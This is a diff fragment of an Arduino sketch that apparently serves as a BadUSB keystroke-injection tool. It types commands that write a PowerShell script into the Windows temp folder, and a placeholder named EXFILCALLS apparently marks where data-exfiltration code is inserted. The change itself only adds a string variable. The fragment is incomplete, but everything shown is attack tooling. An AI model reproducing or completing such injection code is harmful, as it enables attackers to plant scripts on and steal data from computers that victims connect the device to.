@@ -60,6 +60,7 @@ void setup(){
   Keyboard.println("echo $pv = $o.Replace(\"www\",\"uuu\") >> %temp%\\in.ps1");
 
   String fn = "in";
+  String fp;
   EXFILCALLS
 
 
